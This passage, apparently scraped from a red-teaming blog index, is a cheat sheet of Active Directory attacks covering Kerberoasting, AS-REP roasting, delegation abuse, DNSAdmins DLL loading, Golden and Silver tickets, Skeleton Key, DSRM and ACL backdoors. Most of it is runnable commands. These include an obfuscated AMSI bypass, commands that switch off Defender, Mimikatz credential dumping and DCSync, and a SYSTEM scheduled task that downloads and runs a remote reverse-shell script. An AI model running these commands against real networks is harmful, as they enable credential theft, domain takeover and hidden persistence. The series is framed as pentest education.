) 4. Export the all the tickets by mimikatz 5. Keep a note of the file name where the ticket is stored of that service 6. Crack the ticketPowerView1. Find user accounts used as Service accountGet-NetUser -SPNGet-NetUser -SPN -Verbose | select displayname,memberofCmdlet2. Request TGSAdd-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;spn-name-here&quot;3. Check if the TGS has been grantedklistInvoke-Mimikatz4. Export all the ticketsInvoke-Mimikatz -Command &#39;&quot;kerberos::list /export&quot;&#39;tgsrepcrack5. Crack the Hashpython.exe .\\tgsrepcrack.py .\\10k-worst-pass.txt .\\file-name-which-got-exported.kirbiAS-REPs If a user‚Äôs UserAccountControl settings have ‚ÄúDo not require Kerberos preauthentication‚Äù enabled i.e. Kerberos preauth is disabled, it is possible to grab user‚Äôs crackable AS-REP and brute-force it offline. With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.Methodology/Steps 1. Enumerate the users who don‚Äôt require Pre-auth 2. You can try to disable the Pre-auth requirement of a user is you have the Permissions required 3. Do a AS-REP request against the user and capture the hash 4. Use JTR to crack the hashPowerView Dev1. Enumerate usersGet-DomainUser -PreauthNotRequired -VerboseCheck RDPUsers rights on ACL‚Äôs (extra)Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;RDPUsers&quot;}Disable Kerberos Preauth (extra)Set-DomainObject -Identity &amp;lt;user&amp;gt; -XOR @{useraccountcontrol=4194304} -VerboseASREPRoast2. Request AS-REPGet-ASREPHash -UserName USER -VerboseTo enumerate all users with Kerberos preauth disabled and request a hash (extra)Invoke-ASREPRoast -VerboseSet-SPN With enough rights (GenericAll/GenericWrite), a target user‚Äôs SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be ‚ÄúKerberoasted‚Äù.Methodology/Steps 1. Search all the members who have the specific group required on ACL‚Äôs; In this case RDPUsers 2. Check if the SPN does not already exist 3. If not create a unique SPN for that account 4. Request a TGS 5. Export the tickets 6. Crack the file created of that service using JTR or tgsrepcrackPowerView Dev1. Check group rights on ACL‚ÄôsInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;RDPUsers&quot;}2. Check if the user already has a SPNGet-DomainUser -Identity &amp;lt;user-here&amp;gt; | select serviceprincipalname3. Set a SPN for the user (must be unique for the domain)Set-DomainoObject -Identity &amp;lt;user-here&amp;gt; -Set @{serviceprincipalname=&#39;ops/whatever1&#39;}Cmdlet4. Request TGSAdd-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;ops/whatever1&quot;Check if the TGS has been grantedklistInvoke-Mimikatz5. Export all the ticketsInvoke-Mimikatz -Command &#39;&quot;kerberos::list /export&quot;&#39;Get hash of target directly (extra)Get-DomainUser -Identity &amp;lt;user-here&amp;gt; | Get-DomainSPNTicket | select -ExpandProperty Hashtgsrepcrack6. Crack the Hashpython.exe .\\tgsrepcrack.py .\\10k-worst-pass.txt .\\file-name-which-got-exported.kirbiUnconstrained Delegation Kerberos Delegation allows to ‚Äúreuse the end-user credentials to access resources hosted on a different server‚Äù. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server‚Äôs service account. Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.A Quick Explanation A user provides credentials to the Domain Controller. The DC returns a TGT. The user requests a TGS for the web service on Web Server. The DC provides a TGS. The user sends the TGT and TGS to the web server. The web server service account use the user‚Äôs TGT to request a TGS for the database server from the DC. The web server service account connects to the database server as the user.Types of DelegationsThere are two main types of delegation : Unconstrained Delegation : the first hop server can request access to any service on any computer Constrained Delegation : the first hop server has a list of service it can requestUnconstrained DelegationMachine In Unconstrained Delegation The DC places user‚Äôs TGT inside TGS. When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user‚Äôs TGT to access any other resource as the user. This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machineMethodology/Steps 1. For an example we have machine pwn1 as an Unconstrained user; We are pwn0 and we got foot-hold/credentials/hashes for machine pwn2 who has local admin access for machine pwn1; Hence we can perform this attack 2. Get a Powershell session as a different user using ‚ÄúOver pass the hash‚Äù attack if required(in this case its pwn2/appadmin) 3. We can try searching for local admins it has access to using Find-LocalAdminAccess -Verbose 4. Create a New-PSSession attaching to the ‚ÄúUnconstrained user‚Äù 5. Enter the new session using Enter-PSSession 6. Bypass the AMSI 7. EXIT 8. Load Mimikatz.ps1 on the new session using Invoke-command 9. Enter the new session using Enter-PSSession again 10. Now we can get the admin token and save it to the disk 11. Try and check if you have any file from a DA 12. If not we can try to pull if there is any sessions logged on as Administrator as pwn0 using Invoke-Hunter then run the attack again 13. Once we get an DA token we can Reuse the token using Invoke-Mimikatz 14. Now we can access any service on the DC; Example ls \\\\dc-corp\\C$ or use WMI-CommandsPowerView1. Enumerate computers with Unconstrained DelegationGet-NetComputer -UnConstrainedGet-NetComputer -Unconstrained | select -ExpandProperty name Ignore the domain controllers if they apeare in the list as they have Unconstrained Delegation enabled2. Check if a token is available and save to disk Get the admin token.After compromising the computer with UD enabled, we can trick or wait for an admin connectionInvoke-Mimikatz -Command &#39;&quot;sekurlsa::tickets /export&quot;&#39;3. Reuse of the DA tokenInvoke-Mimikatz -Command &#39;&quot;kerberos::ptt Administrator@krbtgt-DOMAIN.LOCAL.kirbi&quot;&#39;Invoke-HunterPull any sessions if logged on with administrator (if no administrator sesson found)Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -VerboseMethodology/Steps (Printer Bug Method) 1. Same as above perform an OPTH attack to get an elevated shell as DA 2. Set Rubeus.exe on monitor more to capture hashes 3. Run MS-RPRN.exe to abuse the printer bug 4. Copy the b64encoded ticket of administrator of the DC 5. Now we can run a DCSync attack against DC using the injected ticketRubeus.exe1. Set on monitor mode on DA.\\Rubeus.exe monitor /interval:5 /nowrapMS-RPRN.exe2. Abuse the printer bug from the uservm.\\MS-RPRN.exe \\\\dc-user-here \\\\user-from-Poll-Server-MethodRubeus.exe3. Inject the b64 encoded ticket.\\Rubeus.exe ptt /ticket:b64-text-goes-hereInvoke-Mimikatz4. Perform a DCSync attack against DCORP-DC using the injected ticket. .\\Invoke-Mimikatz.ps1Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:dcorp\\krbtgt&quot;&#39;Constrained Delegation Constrained Delegation when enabled on a service account, allows access only to specified services on specified computers as a user. A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user‚Äôs authorization.Extensions Required To impersonate the user, Service for User (S4U) extension is used which provides two extensions: Service for User to Self (S4U2self) : Allows a service to obtain a forwardable TGS to itself on behalf of a user. Service for User to Proxy (S4U2proxy) : Allows a service to obtain a TGS to a second service on behalf of a user. Detailed ExplainationService for User to Self (S4U2self) : Allows a service to obtain a forwardable TGSto itself on behalf of a user with just the user principal name without supplying apassword. The service account must have the &amp;amp; TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION ‚Äî T2A4D UserAccountControl attribute.Service for User to Proxy (S4U2proxy) : Allows a service to obtain a TGS toasecond service on behalf of a user. Which second service? This is controlled bymsDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs towhich the user tokens can be forwarded. onA Quick Explanation A user - X, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible authentication mechanism. The web service requests a ticket from the Key Distribution Center (KDC) for X‚Äôs account without supplying a password, as the websvc account. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that X‚Äôs account is not blocked for delegation. If OK it returns a forwardable ticket for X‚Äôs account (S4U2Self). The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/domain-here. The KDC checks the msDS-AllowedToDelegateTo field on the web service account. If the service is listed it will return a service ticket for requested service (S4U2Proxy). The web service can now authenticate to the CIFS on requested service as X using the supplied TGS.Methodology/Steps 1. List all the users having Constrained Delegation 2. Keep a note of the msDS-AllowedToDelegateTo value 3. Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before) 4. Keep a note of the TGT return ticket 5. Now request a TGS with the 2nd step and 4th step values as parameters in /service and /tgt 6. Keep a note of the TGS return Ticket 7. Now we can inject the TGS return Ticket with Inkove-Mimikatz 8. We can now list the file systems of that account. Example : ls \\\\dc-account\\C$ but can not use any WMI-Commands 10. But if the user DC we can do the same process and then do a DCSync attackPowerView Dev1. Enumerate users and computers with CD enabled. .\\PowerView_dev.ps1# for usersGet-DomainUser -TrustedToAuth# for computersGet-DomainComputer -TrustedToAuthkeko2. Requesting a TGT .\\kekeo.exetgt::ask /user:domain-here /domain:domain.local /rc4:rc4-hash-here3. Request a TGS .\\kekeo.exetgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCALInvoke-Mimikatz4. Inject the ticketInvoke-Mimikatz -Command &#39;&quot;kerberos::ptt TGS.kirbi&quot;&#39;5. Execute DCSync (extra)Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:dcorp\\krbtgt&quot;&#39;6. We can access the file systemls \\\\dc-name-here\\C$Using Rubeus.exe - Users1. We request a TGT for userX using its NTLM hash to get a TGS for userX as the Domain Administrator - Administrator. Then the TGS used to access the service specified in the /msdsspn parameter (which is the filesystem on dc-child).\\Rubeus.exe s4u /user:userX /rc4:rc4-hash-here /impersonateuser:Administrator /msdsspn:&quot;CIFS/dc-child.child-domain.root-domain.LOCAL&quot; /ptt2. Check if TGS is injectedklist3. We can access the file systemls \\\\dc-name-here\\C$Using Rubeus.exe - Computers1. abuse delegation of computerX$ using Rubeus (Note: use the /altservice parameter to include LDAP for DCSync attack).\\Rubeus.exe s4u /user:comuterX$ /rc4:rc4-hash-here /impersonateuser:Administrator /msdsspn:&quot;service-name-here&quot; /altservice:ldap /ptt2. Run the DCSync attack. .\\Invoke-Mimikatz.ps1Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:dcorp\\krbtgt&quot;&#39;DNS Admins It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Need privileges to restart the DNS service.Methodology/Steps 1. List all the DNS admins members 2. Get a powershell session as that user using ‚ÄúOver pass the hash‚Äù since we shall already have the hash 3. Load mimilib.dll using dnscmd 4. Restart the dns of the DC 5. Now all the DNS queries get stored at C:\\Windows\\System32\\kiwidns.logRSAT DNS1. From the privileges of DNSAdmins group member, configure DLL using dnscmd.exednscmd dcorp-dc /config /serverlevelplugindll \\\\172.16.50.100\\d11\\mimilib.dll2. Restart the DNS servicePS&amp;gt; cmdsc \\\\dcorp-dc stop dnssc \\\\dcorp-dc start dns3. Using DNSServer module$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All$dnsettings.ServerLevelPluginDll = &quot;\\\\172.16.50.100\\d11\\mimilib.d11&quot;Set-DnsServerSetting -Inputobject $dnsettings -ComputerName dcorp-dc -VerboseCustom Exploit for Rev shellWe can edit the source code of kdns.c from mikikatz source code and add our own malicious payload using the system() function and get a reverse shell back to us.Tools Used Invoke-Mimikatz download from here : Invoke-Mimikatz PowerView download from here : powerview.ps1 PowerView Dev download from here : powerview.ps1 Invoke-UserHunter download from here : Invoke-UserHunter.ps1 keko download from here : keko DnsCMD download from here : DnsCMD tgsrepcrack.py download from here : tgsrepcrack.py ASREPRoast download from here : ASREPRoast.ps1If you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Domain Persistence", "url": "/posts/Active-Directory-Domain-Persistence/", "categories": "Red-Teaming, Active-Directory-Domain-Persistence", "tags": "active-directory, amsi-bypass, active-directory-domain-persistence", "date": "2022-04-10 07:05:00 +0530", "snippet": "IntroductionWelcome to my fifth article in the Red Teaming Series (Active Directory Domain Persistence). I hope everyone has gone through the previous articles of this series which go through the basic concepts required, high-level Domain enumeration explanation, AD/Windows Local Privilege escalation guide and AD Lateral Movement.If not so, you can give it a read from here.This guide explains Active-Directory Domain Persistence mainly by creating Golden tickets, Silver tickets, Skeleton Keys, DSRM and multiple ACL attacks in detail. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.I will continue to update this article with new Domain Persistence Methods. Throughout the article, I will use Invoke-Mimikatz in performing the persistence on a Windows/Active Directory Domain. If any other tools are required, they will be mentioned at the end.How does the kerberos system work?Let‚Äôs break down every step from the above diagram and understand how the system and authentication occur between the host systems and the domain controller. I hope you already know the basic roles and functions in an Active Directory environment. With that, let‚Äôs begin.1. Client Requests a TGT from KDC The privileged user wants to access a specific service from the application or Kerberos enabled server. The user sends a timestamp to the KDC, which is encrypted and signed with the NTLM hash of the user‚Äôs password. The following is required for the KDC to verify if the request is made from the user it claims to be.2. KDC sends TGT to Client The KDC receives and decrypts the encrypted timestamp. The KDC ensures the request comes from the user it claims to be and responds with a Ticket Granting Ticket(TGT) which can grant another ticket. The sent TGT is encrypted and signed off with the NTML hash of the KRBTG, which is a particular account of the KDC only used for this purpose. This means the TGT can be only read and opened by the KRBTG.3. Client requests for a TGS The client receives the TGT, sends it back to the DC and requests a Ticket Granting Service(TGS) a service. The KDC receives the TGS, decrypts it and does the following validation. The only validation it does is whether it can decrypt the TGT or not. If possible, it assumes all the content inside the TGT is valid. This validation lasts up to 20 minutes for any TGT request sent to the KDC.4. KDC sends TGS with an encrypted session Once the TGT gets decrypted, the KDC responds with the TGS.Note: The KDC has no role other than Privilege role certificate(PRG) The TGS sent from the KDC is encrypted with the NTML hash of the service the user requested from the application or Kerberos enabled server. This means the TGT can be only read and opened by the application server.5. Client sends service ticket The client connects to the application server and presents the TGS it received from the KDC for its requested service. As the TGS is encrypted with the service account‚Äôs NTML hash, it decrypts the TGS and then decides whether the user can access the service or not.6. Application Server sends the timestamp to the client The client receives the service it requested from the application server. There is mutual authentication between the client and the application server so that a legit client doesn‚Äôt end up sending a TGS to a rouge application server.Important points to keep in mind NTLM password hash for Kerberos RC4 encryption. Logon Ticket (TGT) provides user auth to DC. Kerberos policy only checked when TGT is created. DC validates user account only when TGT &amp;gt; 20 mins. Service Ticket (TGS) PAC validation is optional &amp;amp; rare. This is a validation check between the KDC and the application server directly. Server LSASS sends PAC Validation request to DC‚Äôs netlogon service (NRPC) If it runs as a service, PAC validation is optional (disabled) If a service runs as System, it performs server signature verification on the PAC (computer account long-term key). Now, these are the steps of how a Kerberos system works typically. An attacker can abuse every step from the steps mentioned above to gain profit. I assume you have access to the Domain Controller and only require persistence. Since you understand how a Kerberos system works now, we can start on how to abuse these steps.Golden Ticket We will be abusing the 3rd step in the Kerberos system with the help of a golden ticket. A Golden Ticket is signed and encrypted by the hash of KRBTGT account which makes it a valid TGT ticket. Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even deleted/revoked accounts. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine. Password change has no effect on this attack.Methodology/Steps 1. Get a Powershell session as a ‚Äúdomain admin‚Äù using ‚ÄúOver pass the hash‚Äù attack 2. Create a New-PSSession attaching to the ‚Äúdomain controller‚Äù 3. Enter the new session using Enter-PSSession 4. Bypass the AMSI 5. Exit 6. Load Mimikatz.ps1 on the new session using Invoke-command 7. Enter the new session using Enter-PSSession again 8. Now we can execute mimikatz on the DC 9. Keep note of krbtgt hash 10. Now go to any ‚Äúnon domain admin‚Äù account 11. Load Mimikats.ps1 12. Now we can create a ticket using the DC krbtgt hash 13. Now we can access any service on the DC. Example ls \\\\dc-corp\\C$ or PsExec64.exe \\\\adminsys.star.castle.local -u star\\adminsys -p passwordhere cmd Invoke-Mimikatz1. Disable DefenderSet-MpPreference -DisableRealtimeMonitoring $true2. AMSI bypasssET-ItEM ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + &#39;blE:1q2&#39; + &#39;uZx&#39; ) ( [TYpE]( &quot;{1}{O}&quot;-F&#39;F&#39;, &#39;rE&#39; ) ) 3; ( GeT-VariaBle ( &quot;1Q2U&quot; + &quot;zX&quot; ) -VaL_s+).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;(( &quot;{6}{3}{1}{4}{2}{@}{5}&quot; -f&#39;Util&#39;, &#39;A&#39;, &#39;Amsi&#39;,&#39;.Management.&#39;, &#39;utomation.&#39;,&#39;s&#39;, &#39;System&#39; )).&quot;g`etf`iE1D&quot;( ( &quot;{O}{2}{1}&quot; -f&#39;amsi&#39;,&#39;d&#39;,&#39;InitFaile&#39; ),(&quot;{2}{4}{O}{1}{3}&quot; -f &#39;Stat&#39;,&#39;i&#39;,&#39;NonPubli&#39;,&#39;c&#39;,&#39;c,&#39; )).&quot;sE`T`VaLUE&quot;(${n`ULl},${t`RuE} )3. Execute mimikatz on DC as DA to get krbtgt hashInvoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39; -Computername &amp;lt;computer-name&amp;gt;4. Create a ticket on any machine ( ‚Äúpass the ticket‚Äù attack )Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /User:Administrator /domain:domain-name-goes-here /sid:sid-goes-here /krbtgt:hash-goes-here id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#39; /ptt : Inject the ticket in the current Powershell process/does not have the ticket on disk/ticket : Saves the ticket to a file for later use/startoffset : Put proper offset values according to the domain policy using (Get-DomainPolicy -domain moneycorp.local).‚Äùkerberos policy‚Äù else the session might get blocked/not created5. List Kerberos services availableklistExtra CommandsTo use the DCSync feature for getting krbtgt hash execute the below command with DA privilegesInvoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:dcorp\\krbtgt&quot;&#39; Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DCUsing NTML hash of KRBTGT to create a Golden Ticket Requires DA privs which can be done by used over-pass-the-hash to start a PowerShell session as domain admin. Enter a PSSession to the domain controller and dump the hashes.# Enter sessionpowershell -ep bypass$sess = New-PSSession -ComputerName &amp;lt;computer-name&amp;gt;Enter-PSSession $sess# Bypass Protections[star-dc]:PS&amp;gt; Set-MpPreference -DisableRealtimemonitoring $true [star-dc]:PS&amp;gt; Set-MpPreference -DisableIOAVProtection $true# exit PSRemote sessionexit# Get the KRBTGT hashInvoke-Command -FilePath .\\Invoke-Mimikatz.ps1 -Session $sessEnter-PSSession $sess[star-dc]:PS&amp;gt; Invoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39;[star-dc]:PS&amp;gt; Invoke-Mimikatz Now on any machine even if it is not part of the domain but can reach DC over network, we can use the information from the krbtgt hash to create a Golden Ticket.#Note the admin SID. .\\PowerView.ps1Get-DomainSID -Administrator#Load the krbtgt hashInvoke-Mimikatz -Command &#39;&quot;kerberos::golden /user:Administrator /domain:domain-name-here /sid:admin-sid-here /krbtgt:krbtg-hash-here id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#39; Now we can explore the DC file system and execute WMI commandsls \\\\star-dc\\C$\\gwmi -Class win32_computersystem -ComputerName star-dcSilver Ticket We will be abusing the 5th step in the Kerberos system with the help of a silver ticket. A valid TGS (Golden ticket is TGT). Encrypted and Signed by the NTLM hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account. Services rarely check PAC (Privileged Attribute Certificate). Services will allow access only to the services themselves. Reasonable persistence period (default 30 days for computer accounts).List of SPN‚Äôs : https://adsecurity.org/?page_id=183Methodology/Steps 1. Get a Powershell session as a ‚Äúdomain admin‚Äù using ‚ÄúOver pass the hash‚Äù attack 2. Create a New-PSSession attaching to the ‚Äúdomain controller‚Äù 3. Enter the new session using Enter-PSSession 4. Bypass the AMSI 5. Exit 6. Load Mimikatz.ps1 on the new session using Invoke-command 7. Enter the new session using Enter-PSSession again 8. Now we can execute mimikatz on the DC 9. Keep note of krbtgt hash 10. Request access for service of DC using the rc4 hash 11. Schedule and execute a taskInvoke-Mimikatz1. Execute mimikatz on DC as DA to get krbtgt hashInvoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39; -Computername dcorp-dc2. Using hash of the Domain Controller computer account, below command provides access to shares on the DCInvoke-Mimikatz -Command &#39;&quot;kerberos::golden /domain:star-dc /sid:admin-sid-here /target:star-dc /service:CIFS /rc4:rc4-hash-here /user:Administrator /ptt&quot;&#39;3. Schedule and execute a taskschtasks /create /S star-dc /SC Weekly /RU &quot;NT Authority\\SYSTEM&quot; /TN &quot;STCheck&quot; /TR &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://10.10.10.10:8080/Invoke-PowerShellTcp.psi&#39;&#39;&#39;)&#39;&quot;schtasks /Run /S star-dc /TN &quot;STCheck&quot; For accessing WMI, we have to create two tickets: one for HOST service and another for RPCSSSkeleton Key Skeleton key is a persistence technique where it is possible to patch a Domain Controller (Lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware. All the publicly known methods are NOT persistent across reboots.Methodology/Steps 1. Inject the Skeleton key in the DC 2. Now we can access any machine with password as mimikatzInvoke-Mimikatz1. Use the below command to inject a skeleton-KeyInvoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;misc::skeleton&#39; -ComputerName &amp;lt;computer-name&amp;gt; Skeleton Key password is : mimikatz2. Now we can access any machine with valid username and password as mimikatzEnter-PSSession -Computername &amp;lt;computer-name&amp;gt; -credential dcorp\\AdministratorExtra CommandsLSASS running as a protected processIn case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DCmimikatz # privilege::debugmimikatz # !+mimikatz # !processprotect /process:lsass.exe /removemimikatz # misc::skeletonmimikatz # !- The above would be very noisy in logs - Service installation (Kernel mode driver)Directory Service Restore Mode (DSRM) DSRM is Directory Services Restore Mode There is a local administrator on every DC called ‚ÄúAdministrator‚Äù whose password is the DSRM password DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.Methodology/Steps 1. Extract the credentials from the SAM file from the DC 2. Change the Logon Behavior for the DSRM account 3. Pass The Hash of the DSRM administrator and logonInvoke-Mimikatz1. Dump DSRM password (needs DA privs)Invoke-Mimikatz -Command &#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39; -Computername dcorp-dc2. Compare the Administrator hash with the Administrator hash of below commandInvoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39; -Computername dcorp-dc If the NTML hash of the Administrator using the /patch is diffrent than the NTML hash of the Administrator using DSRM dump then it is the correct hash of the DSRM local Administrator3. Add/Edit the Logon Behavior for the DSRM accountSince it is the local administrator of the DC, we can pass the hash to authenticate.But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash#Get a session as the DCEnter-PSSession -Computername dcorp-dc#check DSRM propertyGet-ItemProperty &quot;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\&quot;#If DSRMAdminLognonBehariour attribute not created then create and setNew-ItemProperty &quot;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\&quot; -Name &quot;DsrmAdminLogonBehavior&quot; -Value 2 -PropertyType DWORD -Verbose#If already present but wrong value , then updateSet-ItemProperty -Name &quot;DsrmAdminLogonBehavior&quot; -Value 24. Use below command to pass the hashInvoke-Mimikatz -Command &#39;&quot;sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:dsrm-hash-goes-here /run:powershell.exe&quot;&#39;5. Now we can run commands on the DCls \\\\dcorp-dc\\c$Custom Security Support Provider (SSP)A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are NTLM Kerberos Wdigest CredSSPMimikatz provides a custom SSP - mimilib.dll. The SSP logs start from the next reboot of the machine. This SSP logs local logons, service account and machine account passwords in clear text on the target server.Mimikatz (How to setup the SSP)Method 1Drop the mimilib.dll to system32 and add mimilib to &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages&quot;$packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Ccontrol\\Lsa\\OSconfig\\ -Name &#39;Security Packages&#39;| select -ExpandProperty &#39;Security Packages&#39;$packages += &quot;mimilib&quot;Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\control\\Lsa\\OSconfig\\ -Name &#39;Security Packages&#39; -Value $packagesSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\control\\Lsa\\ -Name &#39;Security Packages&#39; -Value $packagesMethod 2Using mimikatz, inject into Isass (Not stable with Server 2016):Invoke-Mimikatz -Command &#39;&quot;misc::memssp&quot;&#39; Now you can view all the local logo n logs with the credentials in C:\\Windows\\System32\\kiwissp.logACL - AdminSDHolder Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups). Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. Invoke-SDPropagatorRun SDProp manuallyInvoke-SDPropagator -timeoutMinutes 1 -showProgress -VerboseFor Pre-Server 2008 machinesInvoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose Powerview (DEV branch)Add full control permissions for a user to the AdminSDHolderAdd-ObjectAcl -TargetADSprefix &#39;CN=AdminSDHolder,CN=System&#39; -PrincipalSamAccountName user1 -Rights All -VerboseOther Interesting permissions ( Reset-password, Write-members) for a user to the AdminSDHolderAdd-ObjectAcl -TargetADSprefix &#39;CN=AdminSDHolder,CN=System&#39; -PrincipalSamAccountName user1 -Rights ResetPassword -VerboseAdd-ObjectAcl -TargetADSprefix &#39;CN=AdminSDHolder,CN=System&#39; -PrincipalSamAccountName user1 -Rights WriteMembers -VerboseCheck Domain Admin permsGet-ObjectAcl -SamAccountName &quot;Domain Admins&quot; -ResolveGUIDs | ?{$_.IdentityReference -match &#39;user1&#39;}Abusing ResetPassword/ForceChangePasswordSet-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString &quot;Password@123&quot; -AsPlainText -Force) -VerboseAbusing ForceChangePassword with a different user‚Äôs credsImport-Module .\\PowerView_dev.ps1#Setting password for runas user for$SecPassword = ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force#Setting password for runas user for$Cred = New-Object System.Management.Automation.PSCredential(&#39;Domain-Name-Here\\User-here&#39;, $SecPassword)#Set new password fot the user where you can abuse ForceChangePassword$UserPassword = ConvertTo-SecureString &#39;Password1!&#39; -AsPlainText -Force#Update the password for that userSet-DomainUserPassword -Identity User-Whose-Password-You-Want-To-Change-here -AccountPassword $UserPassword -Crendential $CredGet Generic-All Access Import the ADModule and set the SDPropagator PS script in the same path folderAdd-ObjectAcl -TargetADSprefix &#39;CN=AdminSDHolder,CN=System&#39; -PrincipalSamAccountName user1 -Rights All -Verbose$sess = New-PSSession -Computername star-dc.root.localInvoke-Command -FilePath &quot;.\\Invoke-SDPropagator.ps1&quot; -Session $sessEnter-PSSession -Session $sess[star-dc.root.local]:PS&amp;gt; Invoke-SDPropagator -timeoutMinutes 1 -showProgress -VerboseNow if we check the permissions of the user he should have generic-all access availableGet-ObjectAcl -SamAccountName &quot;Domain Admins&quot; -ResolveGUIDs | ?{$_.IdentityReference -match &#39;user1&#39;}Abusing Generic-All AccessAbusing Full-ControlAdd-DomainGroupMember -Identity &#39;Domain Admins&#39; -Members &#39;user1&#39; -VerboseACL - DCSync There are even more interesting ACLs which can be abused. For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run ‚ÄúDCSync‚Äù. Methodology/Steps 1. Check if user has replication rights with PowerView 2. If no replication rights for the users, add them from a Domain Administrator shell 3. Get the hashes of krbtgt or any other user we wantPowerView1. Add Rights for DCSyncAdd-ObjectAcl -TargetDistinguishedName &#39;DC=domain,DC=local&#39; -PrincipalSamAccountName student1 -Rights DCSync -VerboseInvoke-Mimikatz2. Execute DCSyncInvoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:dcorp\\krbtgt&quot;&#39;ACL - Security Descriptors It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users. Administrative privileges are required for this. It, of course, works as a very useful and impactful backdoor mechanism. Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL: ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid ACE for built-in administrators for WMI namespaces A;Cl;CCDCLCSWRPWPRCWD;;;SID Documentation : https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings?redirectedfrom=MSDNMethodology/Steps 1. Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.Set-RemoteWMI1. On local machine for userXSet-RemoteWMI -UserName userX -Verbose2. On remote machine for userX without explicit credentialsSet-RemoteWMI -UserName userX -ComputerName &amp;lt;computer&amp;gt; -namespace &#39;root\\cimv2&#39; -Verbose3. Now we can execute WMI commandsGet-WmiObject -Class win32_operatingsystem -ComputerName &amp;lt;computer&amp;gt;4. On remote machine with explicit credentials. Only root\\cimv2 and nested namespacesSet-RemoteWMI -UserName userX -ComputerName &amp;lt;computer&amp;gt; -Credential Administrator -namespace &#39;root\\cimv2&#39; -Verbose5. On remote machine remove permissionsSet-RemoteWMI -UserName userX -ComputerName &amp;lt;computer&amp;gt; -namespace &#39;root\\cimv2&#39; -Remove -VerboseSet-RemotePSRemoting1. On local machine for userXSet-RemotePSRemoting -UserName userX 